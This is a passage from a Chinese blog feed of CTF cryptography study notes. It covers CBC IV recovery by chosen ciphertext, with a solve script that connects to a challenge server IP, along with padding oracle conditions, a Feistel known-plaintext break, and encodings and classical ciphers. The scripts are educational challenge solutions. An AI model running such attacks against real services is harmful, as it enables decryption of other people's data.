<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Unbuffered</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, stream</span>):</span><br><span class="line">        self.stream = stream</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">self, data</span>):</span><br><span class="line">        self.stream.write(data)</span><br><span class="line">        self.stream.flush()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__getattr__</span>(<span class="params">self, attr</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">getattr</span>(self.stream, attr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">sys.stdout = Unbuffered(sys.stdout)</span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&quot;./flag&quot;</span>, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_cbc</span>(<span class="params">key, iv, m</span>):</span><br><span class="line">    handler = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    <span class="keyword">return</span> handler.encrypt(m).encode(<span class="string">&quot;hex&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_cbc_dec</span>(<span class="params">key, iv, c</span>):</span><br><span class="line">    handler = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    <span class="keyword">return</span> handler.decrypt(c.decode(<span class="string">&quot;hex&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key = os.urandom(<span class="number">16</span>)</span><br><span class="line">iv = flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    c = raw_input(<span class="string">&quot;c:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span> aes_cbc_dec(key, iv, c).encode(<span class="string">&quot;hex&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>此时，输入密文可控，且有解密后的明文返回。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cbc_chosen_cipher_recover_iv</span>(<span class="params">cc,mm</span>):</span><br><span class="line">    <span class="keyword">assert</span> cc[<span class="number">0</span>:<span class="number">16</span>]==cc[<span class="number">16</span>:<span class="number">32</span>]</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_xorstr</span>(<span class="params">a, b</span>):</span><br><span class="line">        s = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">            s += <span class="built_in">chr</span>(<span class="built_in">ord</span>(a[i]) ^ <span class="built_in">ord</span>(b[i]))</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    p0=mm[<span class="number">0</span>:<span class="number">16</span>]</span><br><span class="line">    p1=mm[<span class="number">16</span>:<span class="number">32</span>]</span><br><span class="line">    <span class="keyword">return</span> _xorstr(_xorstr(p0, p1), cc[<span class="number">0</span>:<span class="number">16</span>])</span><br><span class="line"></span><br><span class="line">target=(<span class="string">&quot;47.97.215.88&quot;</span>,<span class="number">10001</span>)</span><br><span class="line">io=zio(target)</span><br><span class="line">io.read_until(<span class="string">&quot;c:&quot;</span>)</span><br><span class="line">io.writeline((<span class="string">&quot;1&quot;</span>*<span class="number">32</span>).encode(<span class="string">&quot;hex&quot;</span>))</span><br><span class="line">mm=io.readline().strip().decode(<span class="string">&quot;hex&quot;</span>)</span><br><span class="line">iv=cbc_chosen_cipher_recover_iv(<span class="string">&quot;1&quot;</span>*<span class="number">32</span>,mm)</span><br><span class="line"><span class="built_in">print</span> iv</span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
<h4 id="padding-oracle-attack">Padding Oracle Attack</h4>
<p>满足的攻击条件：</p>
<ul>
<li>加密时采用了<strong>PKCS5</strong>的填充【填充的数值是填充的字符个数。</li>
<li>攻击者可以和服务器进行交互，可以提交密文，服务器会以某种返回信息告知客户端的<strong>Padding</strong>是否正常。</li>
</ul>
<p>可在不清楚<strong>Key</strong>和<strong>IV</strong>的时候解密任意密文。</p>
<p>例如对<strong>Cipher[1]</strong>解密，<strong>Plain[1] =
Decrypt(Cipher[1]) ^ Cipher[0]</strong>。</p>
<p><strong>Cipher[1]</strong>前拼接一个伪造的<strong>Cipher[0]</strong>，用于当做<strong>Cipher[1]</strong>的初始向量，发送<strong>Cipher</strong>解密。</p>
<p>爆破<strong>Cipher[1]</strong>解密后<strong>Plain[0]</strong>的最后一位流程如下：</p>
<p>构造<strong>Cipher[0]</strong>最后一位为<strong>X ^
1</strong>，发送并观察<strong>Padding</strong>的结果是否正确，错误返回<strong>1</strong>。</p>
<h3 id="feistel-密码结构">Feistel 密码结构</h3>
<p><strong>Feistel</strong>密码结构是用于分组密码中的一种对称结构。</p>
<p>一组明文分成二组，<strong>L</strong>和<strong>R</strong>。</p>
<p><strong>L</strong>使用<strong>K[i]</strong>作为秘钥经过<strong>F()</strong>加密，再和<strong>R</strong>异或后作为下一轮的<strong>R</strong>，<strong>R</strong>不变作为下一轮的<strong>L</strong>。</p>
<p>每一轮都是可推理的，且每个的内容均为<strong>L ^ R ^ K</strong>。</p>
<table>
<thead>
<tr class="header">
<th style="text-align: center;">L</th>
<th style="text-align: center;"><strong>R</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;"><strong>R</strong></td>
<td style="text-align: center;"><strong>R<sup>L</sup>K1</strong></td>
</tr>
<tr class="even">
<td style="text-align: center;"><strong>R<sup>L</sup>K1</strong></td>
<td style="text-align: center;"><strong>L<sup>K1</sup>K2</strong></td>
</tr>
<tr class="odd">
<td style="text-align: center;"><strong>L<sup>K1</sup>K2</strong></td>
<td style="text-align: center;"><strong>R<sup>K2</sup>K3</strong></td>
</tr>
<tr class="even">
<td style="text-align: center;"><strong>R<sup>K2</sup>K3</strong></td>
<td
style="text-align: center;"><strong>R<sup>L</sup>K1<sup>K3</sup>K4</strong></td>
</tr>
<tr class="odd">
<td
style="text-align: center;"><strong>R<sup>L</sup>K1<sup>K3</sup>K4</strong></td>
<td
style="text-align: center;"><strong>L<sup>K1</sup>K2<sup>K4</sup>K5</strong></td>
</tr>
<tr class="even">
<td
style="text-align: center;"><strong>L<sup>K1</sup>K2<sup>K4</sup>K5</strong></td>
<td
style="text-align: center;"><strong>R<sup>K2</sup>K3<sup>K5</sup>K6</strong></td>
</tr>
<tr class="odd">
<td
style="text-align: center;"><strong>R<sup>K2</sup>K3<sup>K5</sup>K6</strong></td>
<td
style="text-align: center;"><strong>R<sup>L</sup>K1<sup>K3</sup>K4<sup>K6</sup>K7</strong></td>
</tr>
<tr class="even">
<td style="text-align: center;"><strong>R^KY</strong></td>
<td style="text-align: center;"><strong>L<sup>R</sup>KX</strong></td>
</tr>
</tbody>
</table>
<p>如果<strong>F()</strong>函数是线性的，即可进行已知明文攻击。</p>
<p>只要知道一组明密文对，就可以解密所有密文。</p>
<h4 id="例题-3">例题</h4>
<p><strong>Jarvis OJ</strong>的一题<strong>xfz</strong>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">a,b</span>):</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(a)==<span class="built_in">len</span>(b)</span><br><span class="line">    c=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">        c+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(a[i])^<span class="built_in">ord</span>(b[i]))</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">round</span>(<span class="params">M,K</span>):</span><br><span class="line">    L=M[<span class="number">0</span>:<span class="number">27</span>]</span><br><span class="line">    R=M[<span class="number">27</span>:<span class="number">54</span>]</span><br><span class="line">    new_l=R</span><br><span class="line">    new_r=xor(xor(R,L),K)</span><br><span class="line">    <span class="keyword">return</span> new_l+new_r</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fez</span>(<span class="params">m,K</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> K:</span><br><span class="line">        m=<span class="built_in">round</span>(m,i)</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line">K=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    K.append(os.urandom(<span class="number">27</span>))</span><br><span class="line">m=<span class="built_in">open</span>(<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(m)&lt;<span class="number">54</span></span><br><span class="line">m+=os.urandom(<span class="number">54</span>-<span class="built_in">len</span>(m))</span><br><span class="line"></span><br><span class="line">test=os.urandom(<span class="number">54</span>)</span><br><span class="line"><span class="built_in">print</span> test.encode(<span class="string">&quot;hex&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> fez(test,K).encode(<span class="string">&quot;hex&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> fez(m,K).encode(<span class="string">&quot;hex&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> xor(test[:<span class="number">27</span>],m[:<span class="number">27</span>]).encode(<span class="string">&quot;hex&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5ca045c3402219b13eee964e650fefb438d6bcaf1081cf86b50ebcade518e4c5c4b5c8567492405e26f1bcd47015ba86947600f4fb3a</span></span><br><span class="line"><span class="comment"># e8cb1fadcb6c4be6fe4a9a67e1507833c0db402e6b1eb91d3377f16fd805f15b1116443bb359245fab6251db8dc382edef95a89b3207</span></span><br><span class="line"><span class="comment"># 7c586f783cc0cd40de53759c7ac1d22d719a654f16ff96b76afa8fc187518097f9ec2051214cced65046900d2c6c7adfbe45e21dd8a1</span></span><br></pre></td></tr></table></figure>
<p>根据如上加密过程，推得公式如下。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">test_K[:27] = test[-27:] ^ K2 ^ K3 ^ K5 ^ K6</span><br><span class="line">m_K[:27] = m[-27:] ^ K2 ^ K3 ^ K5 ^ K6</span><br><span class="line">m[-27:] = test[-27:] ^ test_k[:27] ^ m_K[:27]</span><br><span class="line"></span><br><span class="line">test_K[-27:] = test[:27] ^ test[-27:] ^ K1 ^ K3 ^ K4 ^ K6 ^ K7</span><br><span class="line">m_K[-27:] = m[:27] ^ m[-27:] ^ K1 ^ K3 ^ K4  ^ K6 ^ K7</span><br><span class="line">m[:27] = test_K[-27:] ^ test[:27] ^ test[-27:] ^ m_K[-27:] ^ m[-27:]</span><br></pre></td></tr></table></figure>
<p>根据公式写出脚本。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">test = <span class="string">&quot;d8dc053d372d0690194553d7ffbed36750703f417bcb989f98b181a07203ec4807e239df7f4dd9f983cc8d5081b8f7673e7b9ea32b51&quot;</span>.decode(<span class="string">&quot;hex&quot;</span>)</span><br><span class="line">test_K = <span class="string">&quot;f55847d90055888b420b5e3921f3697a63fe88e6c6541a8e53e58cd89e1702c45498b45b57516feb01925de8fa9e359ce226ed1aa5be&quot;</span>.decode(<span class="string">&quot;hex&quot;</span>)</span><br><span class="line">m_K = <span class="string">&quot;6c5c2c047a3a59dceb196ebad9dd9e98055e3f0325f0891e783010ff2a1885f2702a009f655e649bf4d7b3811c20a75bbc1d84c3a8c7&quot;</span>.decode(<span class="string">&quot;hex&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(a) == <span class="built_in">len</span>(b)</span><br><span class="line">    c = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">        c += <span class="built_in">chr</span>(<span class="built_in">ord</span>(a[i]) ^ <span class="built_in">ord</span>(b[i]))</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m_back = xor(xor(test_K[:<span class="number">27</span>], m_K[:<span class="number">27</span>]), test[-<span class="number">27</span>:])</span><br><span class="line"></span><br><span class="line">m_front = xor(xor(xor(test_K[-<span class="number">27</span>:], test[:<span class="number">27</span>]), xor(test[-<span class="number">27</span>:], m_K[-<span class="number">27</span>:])), m_back)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> m_front + m_back</span><br><span class="line"><span class="comment"># flag&#123;festel_weak_666_10fjid9vh12h3nvm&#125;Z�;o6!������</span></span><br></pre></td></tr></table></figure>
<h3 id="更多高级的攻击方式">更多高级的攻击方式</h3>
<ul>
<li>差分攻击</li>
<li>积分攻击</li>
<li>MITM</li>
<li>代数攻击</li>
</ul>
<h3 id="refer">Refer</h3>
<p><a
href="https://www.jianshu.com/p/129d7dd22305">加密技术01-对称加密-DES原理</a></p>
<p><a href="https://www.ruanx.net/des/">DES算法原理及实现</a></p>
<p><a
href="https://www.cnblogs.com/idreamo/p/9333753.html">数据加密算法--详解DES加密算法原理与实现</a></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>密码学 从入门到放弃 古典密码</title>
    <url>/Study-Cipher-Classical/</url>
    <content><![CDATA[<p><strong>XMan
Day2</strong>，整理一下<strong>bibi</strong>师傅的笔记。</p>
<p>古典密码部分。</p>
<p>古典密码学通常可以拿到加密算法【否则要么脑洞要么就是特征明显的题，且大部分是唯密文攻击。</p>
<span id="more"></span>
<p>前情提要介绍一下编码</p>
<h2 id="编码">编码</h2>
<p>编码是为了传输方便以及协议中的格式统一。</p>
<h3 id="hex">HEX</h3>
<ul>
<li>实际存储内容的<strong>16</strong>进制表示。</li>
<li>冗余：<strong>1：2</strong>【<strong>1</strong>个<strong>byte</strong>会变成<strong>2</strong>个<strong>bytes</strong>进行存储。</li>
<li>识别：只存在<strong>0-9</strong>，<strong>A-F</strong>，<strong>a-f</strong>。</li>
<li>一般用处：可作为各类编码转换的过渡，最常见的是<strong>str</strong>和<strong>int</strong>的转换。</li>
</ul>
<h3 id="base家族">Base家族</h3>
<ul>
<li><strong>Base64/32/16</strong>：用<strong>64/32/16</strong>种<strong>bytes</strong>表示所有的<strong>bytes</strong>。</li>
<li>越多的可见字符数来表现其他所有的字符越节省空间。</li>
<li><strong>Base16==hex</strong>【使用特定的<strong>16</strong>个字符表达所有的字符，<strong>2<sup>4→2</sup>8</strong>。</li>
<li><strong>Base64</strong>【<strong>base32</strong>同理，使用特定的<strong>64</strong>个字符表达所有的字符，
<strong>2<sup>6→2</sup>8</strong>。</li>
<li>单个字符取前六个<strong>bits</strong>根据编码表转码，后两位<strong>bits</strong>归入下一个字符。</li>
</ul>
<h4 id="例题">例题</h4>
<p>当<strong>Base64</strong>的表被替换，该如何编码解码。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># /usr/bin/python</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line">base64_table = [<span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;T&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;o&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;/&#x27;</span>][::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode_b64</span>(<span class="params">s</span>):</span><br><span class="line">    l = <span class="built_in">len</span>(s)</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; l:</span><br><span class="line">        <span class="comment"># 将字符转换为二进制编码，然后对齐</span></span><br><span class="line">        s1 = s[i]</span><br><span class="line">        b1 = <span class="built_in">bin</span>(<span class="built_in">ord</span>(s1))[<span class="number">2</span>:]</span><br><span class="line">        cb1 = b1.rjust(<span class="number">8</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> i &gt;= l:</span><br><span class="line">            cb2 = <span class="string">&#x27;00000000&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            s2 = s[i]</span><br><span class="line">            b2 = <span class="built_in">bin</span>(<span class="built_in">ord</span>(s2))[<span class="number">2</span>:]</span><br><span class="line">            cb2 = b2.rjust(<span class="number">8</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> i &gt;= l:</span><br><span class="line">            cb3 = <span class="string">&#x27;00000000&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            s3 = s[i]</span><br><span class="line">            b3 = <span class="built_in">bin</span>(<span class="built_in">ord</span>(s3))[<span class="number">2</span>:]</span><br><span class="line">            cb3 = b3.rjust(<span class="number">8</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">        <span class="comment"># 将三字节转换为四字节</span></span><br><span class="line">        cb = cb1 + cb2 + cb3</span><br><span class="line">        rb1 = cb[:<span class="number">6</span>]</span><br><span class="line">        rb2 = cb[<span class="number">6</span>:<span class="number">12</span>]</span><br><span class="line">        rb3 = cb[<span class="number">12</span>:<span class="number">18</span>]</span><br><span class="line">        rb4 = cb[<span class="number">18</span>:]</span><br><span class="line">        <span class="comment"># 转换后的编码转为十进制备用</span></span><br><span class="line">        ri1 = <span class="built_in">int</span>(rb1, <span class="number">2</span>)</span><br><span class="line">        ri2 = <span class="built_in">int</span>(rb2, <span class="number">2</span>)</span><br><span class="line">        ri3 = <span class="built_in">int</span>(rb3, <span class="number">2</span>)</span><br><span class="line">        ri4 = <span class="built_in">int</span>(rb4, <span class="number">2</span>)</span><br><span class="line">        <span class="comment"># 处理末尾为０的情况，以＇＝＇填充</span></span><br><span class="line">        <span class="keyword">if</span> i - <span class="number">1</span> &gt;= l <span class="keyword">and</span> ri3 == <span class="number">0</span>:</span><br><span class="line">            ri3 = -<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> i &gt;= l <span class="keyword">and</span> ri4 == <span class="number">0</span>:</span><br><span class="line">            ri4 = -<span class="number">1</span></span><br><span class="line">        result += base64_table[ri1] + base64_table[ri2] + base64_table[ri3] + base64_table[ri4]</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> encode_b64(<span class="built_in">open</span>(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;r&quot;</span>).read())</span><br><span class="line"><span class="comment"># output: mZOemISXmpOTkKCHkp6Rgv==</span></span><br></pre></td></tr></table></figure>
<p>两种思路，一是自己实现一个<strong>base64</strong>的解密算法来解，二是替换原表中的字符来恢复正常的编码，这儿列出第二种解题脚本。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">base64_table = [<span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;T&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;o&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;/&#x27;</span>][::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">old_base64_table = [<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;T&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;=&#x27;</span>, ]</span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&quot;mZOemISXmpOTkKCHkp6Rgv==&quot;</span>:</span><br><span class="line">    res += old_base64_table[base64_table.index(i)]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>
<h3 id="其他"><a
href="https://www.tuicool.com/articles/2E3INnm">其他</a></h3>
<p>还有<strong>URLencode</strong>、<strong>morsecode</strong>、<strong>jsfuck</strong>、<strong>uuencode</strong>、<strong>Xxencode</strong>、<strong>Unicode</strong>编码、<strong>Escape/Unescape</strong>编码、<strong>HTML</strong>实体编码等诸多编码，挖坑待补充。</p>
<h2 id="古典密码">古典密码</h2>
<h3 id="移位密码">移位密码</h3>
<p>仅对密文的排列顺序进行变化。</p>
<h4 id="简单移位">简单移位</h4>
<p>将密文以数字<strong>k</strong>的长度<strong>4</strong>进行分组，后按<strong>k</strong>的排列顺序排列密文，而攻击方法为肉眼识别、爆破秘钥、根据<strong>flag</strong>字符串逆推。</p>
<h4 id="曲路密码">曲路密码</h4>
<p>一般是将明文填入一个表中，并按照一定的曲路遍历，攻击方法只需逆向遍历。</p>
<h4 id="云影密码">云影密码</h4>
<p>仅包含<strong>01248</strong>，以<strong>0</strong>分割，其他数字取和后按照<strong>26</strong>字母表转化。</p>
<h4 id="栅栏密码">栅栏密码</h4>
<p>秘钥只有一个<strong>k</strong>，表示栅栏长度。把密文按每组<strong>k</strong>个分组，循环<strong>k</strong>次，取每组第<strong>k</strong>个字符拼接。</p>
